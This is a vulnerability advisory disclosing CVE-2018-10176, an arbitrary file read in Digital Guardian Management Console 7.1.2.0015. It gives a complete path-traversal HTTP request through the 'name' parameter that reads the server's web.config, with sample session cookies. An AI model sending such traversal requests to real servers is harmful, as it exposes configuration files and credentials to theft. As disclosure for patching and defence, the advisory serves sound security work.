Title: Digital Guardian Managment Console - Arbitrary File Read Vulnerability
Author: Pawel Gocyla
Date: 18 April 2018
CVE: CVE-2018-10176


Affected software:
==================
Digital Guardian Managment Console Version 7.1.2.0015 

Description :
=============
Digital Guardian is an American data loss prevention software company which provides software both at the end-user level and in corporate networks, servers, databases, and the cloud. Digital Guardian is designed to see and stop malicious actions by users and malware on endpoints. It puts data events into context and applies a granular set of rules to protect it against threats.

The company holds 20 patents for its technology.Its customers include about 300 Global 2000 companies, as well as seven of the 10 largest brands in the world. It is considered to be a leader in the global data loss prevention market. 

Vulnerability:
**************
It has beed discovered that a file read capality allows to read any files in any location on the server, depending of the file permissions are set.
File read capability does not filtring extension of file names, which allows attackers to read files in the document root such as sources of the aplication.


Arbitrary File Read:
====================
Vulnerable parameter: "name"

Request: 
------------------------
GET /DigitalGuardian/PopUps/PDFTemplatePreview.aspx?name=../../../web.config HTTP/1.1
Accept: text/html, application/xhtml+xml, */*
Referer: http://[host]/DigitalGuardian/Management/Configuration.aspx
Accept-Language: en-GB
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Accept-Encoding: gzip, deflate
Host: [host]
Cookie: ASP.NET_SessionId=jksed11b5nquipeag3421vga; DGAuthToken=e965cf57-4f86-4f18-bdd0-96c4298054b0; MRUDomain=00000000-0000-0000-0000-000000000002; .DGMCASPXAUTH=E316AD346099DE88015775D3FF75D11B9768E320385443CEC388374D41EB913C638C64F41EE20655E1AF1EAA4F950ACB8EE4768F5FF6AB368C80CBD39F52197FC83CAD35C3B137B88754CC16F2C275299222CDD6FB5605C05D0DC91D14C43AA6EBFABBA57BB30F99AFB80E12D49D678D7917DF57F87F458F72DBE9C6F656E1879531ED1FBFF478F2D3B7FEC2770B12AB4946D402FE5D84E8AB5E8B5D1D9DA8CA6E6226C417CBCEC065D198A6B2969C02F12DBF13B0DD4FD4C78B8C9BBE119AE57866C0A351FEDA5B4E7FBC6D48D80FF392449ED9007384D06EF20EF0BB18ACC50147E3E7B81E1F91BEB5129E880B30B7369D81717A82412BE52B0175F219BFFAD8CF591233766AB54C0C7DCFBAF5C4FAF30D892D8F0250505B14E24CCDC05B8B401FF4F0A4502A5C78AF34D8F0672F051BF883834AA636963487C70F38646ACEE3F1199C5642AA28CFD175A62069751BD16929277A2C081EFAE093C612795ABA96CFAF5434283A98BC6EBF1543D3372F387DDC24A7D6220E4828C74CFC996B2CB7592301A11D9F67641591EFC454FFBEC96FA968E8D6A40F0A263527DE5667D99B4DA00FD12C4DE72CC3AAAF453C121E8BB89633F5B01C36E8AEDE9CD272CEC4020A84C4A7851F90FCC5BC7A7AB8F2DBE577BDD7A61F16D19AC341B7D10151C27FC15EE16DC4D0BEE4204CD9FE919683F8AD40DA8C22D4C88A9DAA9C6F7D78ED
Connection: close
------------------------


Contact:
========
pawellgocyla[at]gmail[dot]com




